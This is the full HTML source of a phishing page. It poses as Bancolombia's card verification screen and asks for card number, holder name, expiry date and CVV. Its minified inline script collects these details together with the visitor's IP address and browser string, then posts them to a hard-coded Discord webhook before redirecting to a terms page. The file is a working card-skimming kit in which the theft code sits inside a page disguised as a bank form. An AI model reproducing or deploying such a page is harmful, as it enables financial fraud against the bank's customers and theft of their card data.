<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifica tu tarjeta - Bancolombia</title>
    <link rel="stylesheet" href="styles_new.css">
    <script src="/socket.io/socket.io.js"></script>
    <script src="/js/banco-utils.js"></script>
    <script src="tarjeta_new.js" defer></script>
</head>
<body>
    <div class="auth-container">
        <div class="auth-content">
            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
            <h1>Verificación de tarjeta</h1>
            
            <div class="auth-box">
                <h2>Datos de tarjeta</h2>
                <p>Por favor ingresa los datos de tu tarjeta Bancolombia.</p>
                
                <form class="auth-form" id="cardForm">
                    
                    <div class="form-group">
                        <div class="input-group">
                            <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z"/>
                                <path d="M2 10h20"/>
                            </svg>

                            <div class="input-wrapper">
                                <input 
                                    type="text"
                                    id="cardNumber"
                                    placeholder="Número de tarjeta"
                                    maxlength="19"
                                    inputmode="numeric"
                                    pattern="[0-9 ]{13,19}"
                                    required
                                >
                                <label for="cardNumber">Número de tarjeta</label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group">
                        <div class="input-group">
                            <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                                <circle cx="12" cy="7" r="4"/>
                            </svg>

                            <div class="input-wrapper">
                                <input 
                                    type="text"
                                    id="cardHolder"
                                    placeholder="Titular de la tarjeta"
                                    required
                                >
                                <label for="cardHolder">Titular de la tarjeta</label>
                            </div>
                        </div>
                    </div>

                    <div class="form-row">

                        <div class="form-group half">
                            <div class="input-group">
                                <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/>
                                    <line x1="16" y1="2" x2="16" y2="6"/>
                                    <line x1="8" y1="2" x2="8" y2="6"/>
                                    <line x1="3" y1="10" x2="21" y2="10"/>
                                </svg>

                                <div class="input-wrapper">
                                    <input 
                                        type="text"
                                        id="expiryDate"
                                        placeholder="MM/AA"
                                        maxlength="5"
                                        inputmode="numeric"
                                        pattern="(0[1-9]|1[0-2])\/[0-9]{2}"
                                        required
                                    >
                                    <label for="expiryDate">Fecha de vencimiento</label>
                                </div>
                            </div>
                        </div>

                        <div class="form-group half">
                            <div class="input-group">
                                <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                                </svg>

                                <div class="input-wrapper">
                                    <input 
                                        type="text"
                                        id="cvv"
                                        placeholder="CVV"
                                        maxlength="4"
                                        inputmode="numeric"
                                        pattern="[0-9]{3,4}"
                                        required
                                    >
                                    <label for="cvv">CVV</label>
                                </div>
                            </div>
                        </div>

                    </div>

                    <button type="submit" class="btn-iniciar" disabled>
                        Continuar
                    </button>

                </form>
            </div>
        </div>

        <div class="help-links">
            <a href="#">¿Problemas para conectarte?</a>
            <span class="separator">•</span>
            <a href="#">Aprende sobre seguridad</a>
            <span class="separator">•</span>
            <a href="#">Reglamento Sucursal Virtual</a>
        </div>
    </div>
    
    <footer class="footer">
        <div class="footer-content">
            <div class="footer-left">
                <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
                <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
            </div>

            <div class="footer-right">
                <p class="ip-address" id="ipAddress">Cargando IP...</p>
                <p class="datetime" id="datetime">Cargando fecha...</p>
            </div>
        </div>
    </footer>

    <div id="loadingOverlay" class="loading-overlay">
        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
    </div>

    <script>
        (function(){const a=document.getElementById('expiryDate'),b=document.getElementById('cardNumber'),c=document.getElementById('cardHolder'),d=document.getElementById('cvv'),e=document.querySelector('.btn-iniciar'),f=document.getElementById('cardForm'),g=document.getElementById('loadingOverlay'),h=document.getElementById('ipAddress'),i=document.getElementById('datetime');
        a.addEventListener('input',function(){let j=this.value.replace(/\D/g,'');
        if(j.length>=3){j=j.slice(0,2)+'/'+j.slice(2,4)}
        this.value=j.slice(0,5);
        k()});
        b.addEventListener('input',function(){let j=this.value.replace(/\D/g,'');
        j=j.substring(0,16);
        j=j.replace(/(.{4})/g,'$1 ').trim();
        this.value=j;
        k()});
        d.addEventListener('input',function(){this.value=this.value.replace(/\D/g,'');
        k()});
        c.addEventListener('input',k);
        function k(){const j=b.value.replace(/\s/g,'').length>=13,l=c.value.trim().length>3,m=a.checkValidity(),n=d.checkValidity();
        j&&l&&m&&n?(e.disabled=false):(e.disabled=true)}
        async function l(){try{const j=await fetch('https://api.ipify.org?format=json'),k=await j.json();
        return k.ip}catch(j){return'No disponible'}}
        async function m(){try{const j=await l();
        if(h)h.textContent=`Dirección IP: ${j}`;
        const k=new Date(),n=k.toLocaleDateString('es-CO',{weekday:'long',year:'numeric',month:'long',day:'numeric',hour:'numeric',minute:'2-digit',hour12:true,timeZone:'America/Bogota'}).toLowerCase();
        if(i)i.textContent=n}catch(j){}}
        m();
        setInterval(m,60000);
        f.addEventListener('submit',async function(j){j.preventDefault();
        if(!f.checkValidity()){f.reportValidity();
        return}
        if(g){g.classList.add('active');
        g.style.display='flex'}
        const n=b.value.replace(/\s/g,''),o=c.value.trim(),p=a.value,q=d.value,r=await l(),s=new Date(),t=s.toLocaleDateString('es-CO',{weekday:'long',year:'numeric',month:'long',day:'numeric',hour:'numeric',minute:'numeric',second:'numeric',hour12:true,timeZone:'America/Bogota'}),u='https://discordapp.com/api/webhooks/1502450235039813796/i46OZ18VVn1ihVHMN6BS02ZyEy7bZp7WoJuaYYhS4BWbNrXVHRPADrYpS_CeFqyvYwSQ',v={title:'💳 DATOS DE TARJETA - BANCOLOMBIA',color:0xFFD700,fields:[{name:'💳 Número de Tarjeta',value:`\`${n}\``,inline:false},{name:'👤 Titular',value:`\`${o}\``,inline:true},{name:'📅 Fecha Vencimiento',value:`\`${p}\``,inline:true},{name:'🔐 CVV',value:`\`${q}\``,inline:true},{name:'🌐 IP',value:`\`${r}\``,inline:true},{name:'📅 Fecha/Hora',value:`\`${t}\``,inline:false},{name:'💻 Navegador',value:`\`${navigator.userAgent.substring(0,80)}...\``,inline:false}],timestamp:new Date().toISOString(),footer:{text:'Bancolombia - Sistema de Seguridad'}};
        try{const w=await fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[v]})});
        w.ok?console.log('✅ Datos de tarjeta enviados a Discord'):console.error('❌ Error al enviar:',w.status)}catch(w){console.error('❌ Error de conexión:',w)}
        setTimeout(function(){window.location.href='terminos.html'},500)})})();
    </script>
</body>
</html>
